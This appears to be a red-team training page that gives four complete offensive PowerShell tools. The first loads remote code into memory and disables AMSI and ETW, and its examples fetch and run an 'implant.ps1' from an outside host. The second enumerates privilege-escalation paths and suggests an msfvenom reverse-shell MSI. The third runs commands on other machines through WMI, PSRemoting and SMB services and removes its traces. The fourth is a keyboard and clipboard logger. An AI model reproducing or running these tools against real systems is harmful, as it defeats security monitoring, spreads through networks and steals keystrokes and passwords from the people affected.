---
layout: training-page
title: "PowerShell Offensive Tools — Red Team Academy"
module: "Programming"
tags:
  - powershell
  - offensive-tools
  - red-team
  - exploitation
page_key: "prog-powershell-offensive-tools"
render_with_liquid: false
---

# PowerShell Offensive Tools

Four complete, standalone PowerShell 7.x scripts for red team operations. Each is a self-contained function with full parameter blocks, comment-based help, and error handling. These complement rather than duplicate the tool-dev section scripts; see also [PowerShell Red Team Cheatsheet](powershell-cheatsheet.md) for the primitives these tools are built on.

---

## Script 1: In-Memory Module Loader with AMSI and ETW Bypass

Downloads a PowerShell module or script from any URI (HTTP, HTTPS, or UNC path), patches AMSI and ETW telemetry for the current session via reflection, then executes the content entirely from memory using `[ScriptBlock]::Create()`. Nothing is written to disk.

```powershell
function Invoke-MemoryModuleLoader {
<#
.SYNOPSIS
    Downloads and executes a PowerShell module from a remote URI entirely in memory,
    with optional AMSI and ETW suppression for the current session.

.DESCRIPTION
    Invoke-MemoryModuleLoader performs the following steps:
      1. Optionally patches amsiInitFailed via reflection (AMSI bypass).
      2. Optionally NOPs EtwEventWrite in ntdll.dll (ETW bypass).
      3. Downloads content from HTTP, HTTPS, or UNC using System.Net.WebClient.
      4. Creates a ScriptBlock from the downloaded string and dot-sources it.

.PARAMETER Uri
    Target URI. Accepts http://, https://, or \\UNC\share\script.ps1.

.PARAMETER Proxy
    Optional proxy URI string, e.g. 'http://proxy.corp.local:8080'.

.PARAMETER Credential
    PSCredential for authenticated downloads (Basic auth injected into WebClient).

.PARAMETER TLS12
    Force TLS 1.2 for all .NET HTTP requests in this session.

.PARAMETER BypassAMSI
    Patch amsiInitFailed to disable AMSI scanning for this session.

.PARAMETER BypassETW
    NOP EtwEventWrite in ntdll to suppress ETW script-block telemetry.

.PARAMETER Arguments
    Hashtable of named arguments splatted into the loaded module's entry point
    if the module exports a function named 'Invoke-Main'.

.EXAMPLE
    Invoke-MemoryModuleLoader -Uri 'https://10.10.14.5/implant.ps1' -TLS12 -BypassAMSI -BypassETW

.EXAMPLE
    $cred = New-Object PSCredential('user', (ConvertTo-SecureString 'pass' -AsPlainText -Force))
    Invoke-MemoryModuleLoader -Uri 'http://10.10.14.5/module.ps1' -Credential $cred -BypassAMSI
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Uri,

        [string]$Proxy,

        [System.Management.Automation.PSCredential]$Credential,

        [switch]$TLS12,

        [switch]$BypassAMSI,

        [switch]$BypassETW,

        [hashtable]$Arguments = @{}
    )

    # ── Optional: Force TLS 1.2 ───────────────────────────────────────────────
    if ($TLS12) {
        [System.Net.ServicePointManager]::SecurityProtocol =
            [System.Net.SecurityProtocolType]::Tls12
        Write-Verbose "[*] TLS 1.2 enforced."
    }

    # ── Optional: AMSI bypass via amsiInitFailed reflection ───────────────────
    if ($BypassAMSI) {
        try {
            $amsiType  = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
            $initField = $amsiType.GetField('amsiInitFailed',
                            [System.Reflection.BindingFlags]'NonPublic,Static')
            $initField.SetValue($null, $true)
            Write-Verbose "[+] AMSI: amsiInitFailed set to true."
        }
        catch {
            Write-Warning "[-] AMSI bypass failed: $($_.Exception.Message)"
        }
    }

    # ── Optional: ETW bypass — NOP EtwEventWrite in ntdll ────────────────────
    if ($BypassETW) {
        try {
            $etwSig = @'
using System;
using System.Runtime.InteropServices;
public class EtwPatch {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(
        IntPtr a, UIntPtr s, uint p, out uint o);
}
'@
            if (-not ([System.Management.Automation.PSTypeName]'EtwPatch').Type) {
                Add-Type -TypeDefinition $etwSig -Language CSharp
            }
            $ntdll = [EtwPatch]::LoadLibrary('ntdll.dll')
            $addr  = [EtwPatch]::GetProcAddress($ntdll, 'EtwEventWrite')
            $old   = [uint32]0
            [EtwPatch]::VirtualProtect($addr, [UIntPtr]::new(1), 0x40, [ref]$old) | Out-Null
            $nop = [byte[]](0xC3)
            [System.Runtime.InteropServices.Marshal]::Copy($nop, 0, $addr, 1)
            [EtwPatch]::VirtualProtect($addr, [UIntPtr]::new(1), $old, [ref]$old) | Out-Null
            Write-Verbose "[+] ETW: EtwEventWrite patched with RET."
        }
        catch {
            Write-Warning "[-] ETW bypass failed: $($_.Exception.Message)"
        }
    }

    # ── Download content ──────────────────────────────────────────────────────
    $content = $null
    try {
        $wc = New-Object System.Net.WebClient

        if ($Proxy) {
            $proxyObj = New-Object System.Net.WebProxy($Proxy, $true)
            if ($Credential) {
                $proxyObj.Credentials = $Credential.GetNetworkCredential()
            }
            $wc.Proxy = $proxyObj
        }

        if ($Credential -and -not $Proxy) {
            $netCred = $Credential.GetNetworkCredential()
            $wc.Credentials = $netCred
            # Inject Basic auth header for HTTP servers that need it
            $pair   = "$($netCred.UserName):$($netCred.Password)"
            $b64    = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($pair))
            $wc.Headers.Add('Authorization', "Basic $b64")
        }

        Write-Verbose "[*] Downloading: $Uri"
        $content = $wc.DownloadString($Uri)
        Write-Verbose "[+] Retrieved $($content.Length) characters."
    }
    catch {
        throw "Download failed from '$Uri': $($_.Exception.Message)"
    }
    finally {
        if ($wc) { $wc.Dispose() }
    }

    # ── Execute from memory ───────────────────────────────────────────────────
    try {
        $sb = [scriptblock]::Create($content)
        . $sb   # dot-source so exported functions land in caller's scope

        # If module exports Invoke-Main, call it with any supplied arguments
        if (Get-Command 'Invoke-Main' -ErrorAction SilentlyContinue) {
            Write-Verbose "[*] Calling Invoke-Main with provided arguments."
            Invoke-Main @Arguments
        }
        Write-Verbose "[+] Module executed successfully from memory."
    }
    catch {
        throw "Execution failed: $($_.Exception.Message)"
    }
}
```

---

## Script 2: Local Privilege Escalation Checker

Enumerates common Windows privilege escalation vectors without touching any external tools. Returns an array of `PSCustomObject` results that can be piped to `Export-Csv` or `ConvertTo-Json`.

```powershell
function Invoke-LocalPrivescCheck {
<#
.SYNOPSIS
    Enumerates common local privilege escalation vectors on a Windows host.

.DESCRIPTION
    Checks the following without requiring external binaries:
      - Unquoted service paths
      - Weak service binary ACLs (writable by non-admin principals)
      - AlwaysInstallElevated registry keys
      - Writable directories in the system PATH
      - Scheduled tasks pointing to writable binaries
      - Potential DLL hijack candidates in PATH (missing DLLs for running processes)
      - Autoruns (Run/RunOnce keys) with writable binary paths

.PARAMETER OutputFormat
    Controls how results are displayed: Table (default), List, CSV, or JSON.

.PARAMETER ExportPath
    If specified, writes results to this file path in the chosen OutputFormat.

.EXAMPLE
    Invoke-LocalPrivescCheck | Where-Object Severity -eq 'HIGH'

.EXAMPLE
    Invoke-LocalPrivescCheck -OutputFormat JSON -ExportPath C:\Windows\Temp\privesc.json
#>
    [CmdletBinding()]
    param(
        [ValidateSet('Table','List','CSV','JSON')]
        [string]$OutputFormat = 'Table',

        [string]$ExportPath
    )

    $findings = [System.Collections.Generic.List[PSCustomObject]]::new()

    function Add-Finding {
        param([string]$Category, [string]$Severity, [string]$Detail, [string]$Recommendation)
        $findings.Add([PSCustomObject]@{
            Category       = $Category
            Severity       = $Severity
            Detail         = $Detail
            Recommendation = $Recommendation
        })
    }

    # ── 1. Unquoted service paths ─────────────────────────────────────────────
    Write-Verbose "[*] Checking unquoted service paths..."
    try {
        Get-WmiObject -Class Win32_Service -ErrorAction Stop |
        Where-Object { $_.PathName -and $_.PathName -notmatch '^"' -and $_.PathName -match ' ' } |
        ForEach-Object {
            $svc  = $_
            $path = $svc.PathName -replace ' .*$', ''
            # Only flag if an intermediate directory is writable
            $dirs = $path -split '\\'
            for ($i = 1; $i -lt $dirs.Count - 1; $i++) {
                $candidate = ($dirs[0..$i] -join '\') + ' '
                $parent    = $dirs[0..$i] -join '\'
                if (Test-Path $parent) {
                    $acl = Get-Acl $parent -ErrorAction SilentlyContinue
                    $writable = $acl.Access | Where-Object {
                        $_.FileSystemRights -match 'Write|FullControl|Modify' -and
                        $_.IdentityReference -match 'Everyone|Users|Authenticated Users|BUILTIN\\Users'
                    }
                    if ($writable) {
                        Add-Finding -Category 'UnquotedServicePath' -Severity 'HIGH' `
                            -Detail "Service '$($svc.Name)' path: $($svc.PathName) | Writable dir: $parent" `
                            -Recommendation "Place a binary at '${candidate}[name].exe' to hijack service start"
                    }
                }
            }
        }
    }
    catch { Write-Warning "Unquoted service path check failed: $($_.Exception.Message)" }

    # ── 2. AlwaysInstallElevated ──────────────────────────────────────────────
    Write-Verbose "[*] Checking AlwaysInstallElevated..."
    $hklm = (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' `
                -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
    $hkcu = (Get-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' `
                -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
    if ($hklm -eq 1 -and $hkcu -eq 1) {
        Add-Finding -Category 'AlwaysInstallElevated' -Severity 'HIGH' `
            -Detail 'Both HKLM and HKCU AlwaysInstallElevated = 1' `
            -Recommendation 'Create a malicious MSI: msfvenom -p windows/x64/shell_reverse_tcp LHOST=... -f msi'
    }

    # ── 3. Writable directories in PATH ──────────────────────────────────────
    Write-Verbose "[*] Checking writable PATH directories..."
    $env:PATH -split ';' | Where-Object { $_ } | ForEach-Object {
        $dir = $_.Trim()
        if (Test-Path $dir -PathType Container) {
            try {
                $acl = Get-Acl $dir -ErrorAction Stop
                $w   = $acl.Access | Where-Object {
                    $_.FileSystemRights -match 'Write|FullControl|Modify' -and
                    $_.IdentityReference -match 'Everyone|Users|Authenticated Users|BUILTIN\\Users'
                }
                if ($w) {
                    Add-Finding -Category 'WritablePATH' -Severity 'MEDIUM' `
                        -Detail "Writable PATH dir: $dir" `
                        -Recommendation 'Drop a hijackable binary here for DLL/EXE hijack'
                }
            }
            catch {}
        }
    }

    # ── 4. Scheduled tasks with writable binary paths ─────────────────────────
    Write-Verbose "[*] Checking scheduled task binary paths..."
    try {
        Get-ScheduledTask -ErrorAction Stop | ForEach-Object {
            $task = $_
            $task.Actions | Where-Object { $_.Execute } | ForEach-Object {
                $exe = $_.Execute -replace '"', ''
                if (Test-Path $exe -PathType Leaf -ErrorAction SilentlyContinue) {
                    $acl = Get-Acl $exe -ErrorAction SilentlyContinue
                    $w   = $acl.Access | Where-Object {
                        $_.FileSystemRights -match 'Write|FullControl|Modify' -and
                        $_.IdentityReference -match 'Everyone|Users|Authenticated Users|BUILTIN\\Users'
                    }
                    if ($w) {
                        Add-Finding -Category 'ScheduledTaskWeakACL' -Severity 'HIGH' `
                            -Detail "Task '$($task.TaskName)' -> $exe (writable)" `
                            -Recommendation 'Replace binary; task will execute it with task principal privileges'
                    }
                }
            }
        }
    }
    catch { Write-Warning "Scheduled task check failed: $($_.Exception.Message)" }

    # ── 5. Autorun keys with writable executables ─────────────────────────────
    Write-Verbose "[*] Checking autorun registry paths..."
    $runKeys = @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce'
    )
    foreach ($key in $runKeys) {
        if (Test-Path $key) {
            (Get-ItemProperty $key -ErrorAction SilentlyContinue).PSObject.Properties |
            Where-Object { $_.Name -notmatch '^PS' } | ForEach-Object {
                $exe = ($_.Value -split '"')[1]
                if (-not $exe) { $exe = ($_.Value -split ' ')[0] }
                if ($exe -and (Test-Path $exe -ErrorAction SilentlyContinue)) {
                    $acl = Get-Acl $exe -ErrorAction SilentlyContinue
                    $w   = $acl.Access | Where-Object {
                        $_.FileSystemRights -match 'Write|FullControl|Modify' -and
                        $_.IdentityReference -match 'Everyone|Users|Authenticated Users|BUILTIN\\Users'
                    }
                    if ($w) {
                        Add-Finding -Category 'AutorunWeakACL' -Severity 'HIGH' `
                            -Detail "Autorun '$($_.Name)' -> $exe (writable)" `
                            -Recommendation 'Replace binary to execute on next logon'
                    }
                }
            }
        }
    }

    # ── Output ────────────────────────────────────────────────────────────────
    if ($findings.Count -eq 0) {
        Write-Host "[+] No obvious privesc vectors found." -ForegroundColor Green
        return
    }

    $output = switch ($OutputFormat) {
        'CSV'  { $findings | ConvertTo-Csv -NoTypeInformation }
        'JSON' { $findings | ConvertTo-Json -Depth 4 }
        'List' { $findings | Format-List | Out-String }
        default{ $findings | Format-Table -AutoSize | Out-String }
    }

    if ($ExportPath) {
        $output | Out-File -FilePath $ExportPath -Encoding UTF8 -Force
        Write-Host "[+] Results written to $ExportPath" -ForegroundColor Cyan
    }
    else {
        Write-Output $output
    }

    return $findings
}
```

---

## Script 3: Lateral Movement via WMI, PSRemoting, or SMB+Service

Accepts a target host, credential, and command string, then executes the command remotely using one of three methods. Includes verification and artifact cleanup.

```powershell
function Invoke-LateralMovement {
<#
.SYNOPSIS
    Executes a command on a remote Windows host via WMI, PSRemoting, or SMB+service.

.DESCRIPTION
    Three execution methods are supported:
      WMI       — Invoke-WmiMethod Win32_Process.Create (no WinRM required)
      PSRemoting — Invoke-Command over WinRM (requires PS remoting enabled)
      SMB       — Copies a script to C$, creates and starts a service, then cleans up

    After execution, the WMI method verifies success by querying Win32_Process.
    The SMB method polls the service state then deletes the service and copied file.

.PARAMETER ComputerName
    Target hostname or IP address.

.PARAMETER Credential
    PSCredential for the remote host. Defaults to current user if omitted.

.PARAMETER Command
    Command string to execute on the remote host.

.PARAMETER Method
    Execution method: WMI (default), PSRemoting, or SMB.

.PARAMETER OutputFile
    Remote path where command output should be written (used by WMI/SMB methods).
    Defaults to C:\Windows\Temp\<random>.txt.

.EXAMPLE
    $cred = New-Object PSCredential('DOMAIN\admin', (ConvertTo-SecureString 'P@ss' -AsPlainText -Force))
    Invoke-LateralMovement -ComputerName srv01 -Credential $cred -Command 'whoami' -Method WMI

.EXAMPLE
    Invoke-LateralMovement -ComputerName srv01 -Command 'ipconfig /all' -Method PSRemoting
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$ComputerName,

        [System.Management.Automation.PSCredential]$Credential,

        [Parameter(Mandatory)]
        [string]$Command,

        [ValidateSet('WMI','PSRemoting','SMB')]
        [string]$Method = 'WMI',

        [string]$OutputFile = "C:\Windows\Temp\$([System.IO.Path]::GetRandomFileName()).txt"
    )

    $splatCred = @{}
    if ($Credential) { $splatCred['Credential'] = $Credential }

    switch ($Method) {

        'WMI' {
            Write-Verbose "[*] WMI method: creating process on $ComputerName"
            $fullCmd = "cmd.exe /c $Command > $OutputFile 2>&1"
            try {
                $result = Invoke-WmiMethod -ComputerName $ComputerName @splatCred `
                    -Class Win32_Process -Name Create -ArgumentList $fullCmd
                if ($result.ReturnValue -ne 0) {
                    throw "Win32_Process.Create returned $($result.ReturnValue)"
                }
                $pid = $result.ProcessId
                Write-Verbose "[+] Process created. PID: $pid"

                # Poll until process exits (max 30 s)
                $deadline = (Get-Date).AddSeconds(30)
                do {
                    Start-Sleep -Milliseconds 500
                    $running = Get-WmiObject -ComputerName $ComputerName @splatCred `
                        -Query "SELECT * FROM Win32_Process WHERE ProcessId = $pid" `
                        -ErrorAction SilentlyContinue
                } while ($running -and (Get-Date) -lt $deadline)

                # Read output via UNC
                $uncOut = "\\$ComputerName\$($OutputFile -replace ':','$')"
                if (Test-Path $uncOut -ErrorAction SilentlyContinue) {
                    $out = Get-Content $uncOut -Raw
                    Remove-Item $uncOut -Force -ErrorAction SilentlyContinue
                    return $out
                }
            }
            catch { throw "WMI lateral movement failed: $($_.Exception.Message)" }
        }

        'PSRemoting' {
            Write-Verbose "[*] PSRemoting method: Invoke-Command on $ComputerName"
            try {
                $sb     = [scriptblock]::Create($Command)
                $output = Invoke-Command -ComputerName $ComputerName @splatCred `
                    -ScriptBlock $sb -ErrorAction Stop
                return $output | Out-String
            }
            catch { throw "PSRemoting failed: $($_.Exception.Message)" }
        }

        'SMB' {
            Write-Verbose "[*] SMB+Service method on $ComputerName"
            $svcName  = "svc$([System.IO.Path]::GetRandomFileName() -replace '\.', '')"
            $remoteC$ = "\\$ComputerName\C$\Windows\Temp\$svcName.bat"
            $remoteSvc= "C:\Windows\Temp\$svcName.bat"

            try {
                # Write batch wrapper to C$
                $batContent = "@echo off`r`n$Command > $OutputFile 2>&1`r`n"
                [IO.File]::WriteAllText($remoteC$, $batContent)
                Write-Verbose "[+] Batch file copied to $remoteC$"

                # Create service
                $sc = & sc.exe "\\$ComputerName" create $svcName binpath= "cmd.exe /c $remoteSvc" start= demand 2>&1
                Write-Verbose "[*] sc create: $sc"

                # Start service
                & sc.exe "\\$ComputerName" start $svcName | Out-Null
                Start-Sleep -Seconds 3

                # Read output
                $uncOut = "\\$ComputerName\$($OutputFile -replace ':','$')"
                $out    = ''
                if (Test-Path $uncOut -ErrorAction SilentlyContinue) {
                    $out = Get-Content $uncOut -Raw
                }

                return $out
            }
            catch { throw "SMB method failed: $($_.Exception.Message)" }
            finally {
                # Cleanup regardless of success/failure
                & sc.exe "\\$ComputerName" stop   $svcName 2>$null | Out-Null
                & sc.exe "\\$ComputerName" delete $svcName 2>$null | Out-Null
                Remove-Item $remoteC$ -Force -ErrorAction SilentlyContinue
                $uncOut = "\\$ComputerName\$($OutputFile -replace ':','$')"
                Remove-Item $uncOut   -Force -ErrorAction SilentlyContinue
                Write-Verbose "[+] Cleanup complete."
            }
        }
    }
}
```

---

## Script 4: Keylogger and Clipboard Monitor

Installs a low-level keyboard hook via P/Invoke and runs a clipboard polling loop, logging to a DPAPI-encrypted file. Runs in a background PowerShell job. A companion `Stop-Keylogger` function unhooks the keyboard and decrypts the log.

```powershell
# ── P/Invoke type definition for SetWindowsHookEx keyboard hook ────────────────
$hookSig = @'
using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class KeyCapture {
    public  static IntPtr    HookHandle    = IntPtr.Zero;
    private static string    LogPath       = string.Empty;
    private static byte[]    Entropy       = Encoding.UTF8.GetBytes("RTA_kl_2026");

    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc _hookCallback;

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,
        IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    private static extern int GetAsyncKeyState(int vKey);

    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN     = 0x0100;

    [StructLayout(LayoutKind.Sequential)]
    private struct KBDLLHOOKSTRUCT {
        public uint   vkCode;
        public uint   scanCode;
        public uint   flags;
        public uint   time;
        public IntPtr dwExtraInfo;
    }

    public static void Install(string logPath) {
        LogPath       = logPath;
        _hookCallback = HookCallback;
        IntPtr hMod   = GetModuleHandle(null);
        HookHandle    = SetWindowsHookEx(WH_KEYBOARD_LL, _hookCallback, hMod, 0);
        if (HookHandle == IntPtr.Zero)
            throw new InvalidOperationException("SetWindowsHookEx failed: " +
                Marshal.GetLastWin32Error());
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            KBDLLHOOKSTRUCT kb = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
            AppendEncrypted(LogPath, $"[VK:{kb.vkCode}]", Entropy);
        }
        return CallNextHookEx(HookHandle, nCode, wParam, lParam);
    }

    public static void AppendEncrypted(string path, string data, byte[] entropy) {
        byte[] raw  = Encoding.UTF8.GetBytes(data);
        byte[] enc  = ProtectedData.Protect(raw, entropy, DataProtectionScope.CurrentUser);
        // Prepend 4-byte length so we can split records on decrypt
        byte[] len  = BitConverter.GetBytes(enc.Length);
        using (var fs = new FileStream(path, FileMode.Append, FileAccess.Write, FileShare.Read))
        {
            fs.Write(len, 0, 4);
            fs.Write(enc, 0, enc.Length);
        }
    }

    public static string[] ReadDecrypted(string path, byte[] entropy) {
        var results = new System.Collections.Generic.List<string>();
        using (var fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
        using (var br = new BinaryReader(fs)) {
            while (fs.Position < fs.Length) {
                int   len  = br.ReadInt32();
                byte[] enc = br.ReadBytes(len);
                byte[] raw = ProtectedData.Unprotect(enc, entropy,
                    DataProtectionScope.CurrentUser);
                results.Add(Encoding.UTF8.GetString(raw));
            }
        }
        return results.ToArray();
    }
}
'@

function Start-Keylogger {
<#
.SYNOPSIS
    Installs a low-level keyboard hook and clipboard monitor that log to an
    encrypted file using DPAPI (CurrentUser scope).

.DESCRIPTION
    Compiles a C# class with SetWindowsHookEx P/Invoke via Add-Type, installs a
    WH_KEYBOARD_LL hook, and starts a background PowerShell job that polls the
    clipboard every 2 seconds. All captured data is written in DPAPI-encrypted
    records to the specified log file.

    Use Stop-Keylogger to remove the hook, stop the job, and read the log.

.PARAMETER LogPath
    Path to the encrypted log file. Defaults to a temp file in %APPDATA%.

.PARAMETER ClipboardInterval
    Clipboard poll interval in seconds. Defaults to 2.

.EXAMPLE
    Start-Keylogger -LogPath "$env:APPDATA\log.bin"

.EXAMPLE
    Start-Keylogger   # uses default log path; call Stop-Keylogger to retrieve
#>
    [CmdletBinding()]
    param(
        [string]$LogPath = "$env:APPDATA\$(([System.IO.Path]::GetRandomFileName()) -replace '\..*','.bin')",
        [int]$ClipboardInterval = 2
    )

    # Compile the C# type (idempotent check)
    if (-not ([System.Management.Automation.PSTypeName]'KeyCapture').Type) {
        Add-Type -TypeDefinition $hookSig -Language CSharp `
            -ReferencedAssemblies 'System.Security'
        Write-Verbose "[+] KeyCapture type compiled."
    }

    # Install low-level keyboard hook
    [KeyCapture]::Install($LogPath)
    Write-Verbose "[+] Keyboard hook installed. Handle: $([KeyCapture]::HookHandle)"

    # Store state in a global for Stop-Keylogger
    $global:KL_LogPath  = $LogPath
    $global:KL_Hook     = [KeyCapture]::HookHandle

    # Background job: clipboard monitor + message pump keep-alive
    $global:KL_Job = Start-Job -ScriptBlock {
        param($lp, $interval)

        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Security

        $entropy = [System.Text.Encoding]::UTF8.GetBytes('RTA_kl_2026')
        $lastClip = ''

        while ($true) {
            Start-Sleep -Seconds $interval

            # Clipboard check
            $clip = [System.Windows.Forms.Clipboard]::GetText()
            if ($clip -and $clip -ne $lastClip) {
                $lastClip = $clip
                $tag  = "[CLIP:$clip]"
                $raw  = [System.Text.Encoding]::UTF8.GetBytes($tag)
                $enc  = [System.Security.Cryptography.ProtectedData]::Protect(
                            $raw, $entropy,
                            [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                $len  = [System.BitConverter]::GetBytes([int]$enc.Length)
                $fs   = [System.IO.File]::Open($lp,
                            [System.IO.FileMode]::Append,
                            [System.IO.FileAccess]::Write,
                            [System.IO.FileShare]::ReadWrite)
                $fs.Write($len, 0, 4)
                $fs.Write($enc, 0, $enc.Length)
                $fs.Dispose()
            }
        }
    } -ArgumentList $LogPath, $ClipboardInterval

    Write-Host "[+] Keylogger started. Log: $LogPath  JobId: $($global:KL_Job.Id)" -ForegroundColor Green
    Write-Host "[*] Run Stop-Keylogger to unhook and read log." -ForegroundColor Yellow
}


function Stop-Keylogger {
<#
.SYNOPSIS
    Unhooks the keyboard hook, stops the clipboard monitor job, and decrypts
    and returns the captured log.

.DESCRIPTION
    Uses the global state set by Start-Keylogger ($global:KL_*). Calls
    UnhookWindowsHookEx, stops the background job, then decrypts each record
    from the log file using DPAPI and returns the concatenated output.

.PARAMETER KeepLogFile
    If specified, the encrypted log file is not deleted after reading.

.EXAMPLE
    Stop-Keylogger

.EXAMPLE
    Stop-Keylogger -KeepLogFile | Out-File C:\Windows\Temp\keylog_plain.txt
#>
    [CmdletBinding()]
    param([switch]$KeepLogFile)

    # Unhook keyboard
    if ($global:KL_Hook -and $global:KL_Hook -ne [IntPtr]::Zero) {
        $ok = [KeyCapture]::UnhookWindowsHookEx($global:KL_Hook)
        Write-Verbose "[+] UnhookWindowsHookEx: $ok"
        $global:KL_Hook = [IntPtr]::Zero
    }

    # Stop clipboard job
    if ($global:KL_Job) {
        Stop-Job  -Job $global:KL_Job -ErrorAction SilentlyContinue
        Remove-Job -Job $global:KL_Job -Force -ErrorAction SilentlyContinue
        $global:KL_Job = $null
        Write-Verbose "[+] Clipboard monitor job stopped."
    }

    # Decrypt and return log
    if ($global:KL_LogPath -and (Test-Path $global:KL_LogPath)) {
        try {
            $entropy = [System.Text.Encoding]::UTF8.GetBytes('RTA_kl_2026')
            $records = [KeyCapture]::ReadDecrypted($global:KL_LogPath, $entropy)
            $output  = $records -join ''

            if (-not $KeepLogFile) {
                Remove-Item $global:KL_LogPath -Force -ErrorAction SilentlyContinue
                Write-Verbose "[+] Log file deleted."
            }

            $global:KL_LogPath = $null
            return $output
        }
        catch {
            Write-Warning "Failed to decrypt log: $($_.Exception.Message)"
        }
    }
    else {
        Write-Warning "No log file found at '$($global:KL_LogPath)'"
    }
}
```

**Usage example:**

```powershell
# Load the script
. .\powershell-offensive-tools.ps1

# Start capturing
Start-Keylogger -LogPath "$env:TEMP\events.bin" -ClipboardInterval 3

# ... wait for target activity ...

# Stop and retrieve plaintext log
$captured = Stop-Keylogger
$captured | Out-File "$env:TEMP\keylog.txt"
```

---

## Resources

- [AMSI Documentation — Microsoft](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
- [PowerShell Security — Microsoft Learn](https://learn.microsoft.com/en-us/powershell/scripting/security/preventing-script-injection-attacks)
- [LOLBAS Project](https://lolbas-project.github.io/)
- [PayloadsAllTheThings — PowerShell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Powershell%20-%20Cheatsheet.md)
- [Windows Privilege Escalation Fundamentals — fuzzysecurity](http://www.fuzzysecurity.com/tutorials/16.html)
- [WMI for Offense, Defense, and Forensics — FireEye/Mandiant](https://www.mandiant.com/resources/blog/wmi-offense-defense-forensics)
- [pinvoke.net — P/Invoke Signatures](http://pinvoke.net/)
- [ired.team — Lateral Movement](https://www.ired.team/offensive-security/lateral-movement)
